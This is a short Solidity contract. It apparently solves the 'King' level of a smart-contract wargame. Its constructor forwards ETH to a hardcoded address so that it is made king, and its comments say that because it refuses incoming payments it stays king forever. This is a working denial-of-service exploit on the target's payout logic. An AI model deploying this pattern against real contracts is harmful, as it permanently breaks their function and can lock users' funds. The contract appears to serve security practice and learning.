// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract King {
    constructor() payable {
        // contract will be made king
        // but this contract does not accept eth payments
        // we will stay king forever

        (bool success,) = payable(0x018729b2ad527f8957b715ad64ab005c1A0D8cf3).call{value: msg.value}("");
        require(success, "Failed to send ETH");
    }
}
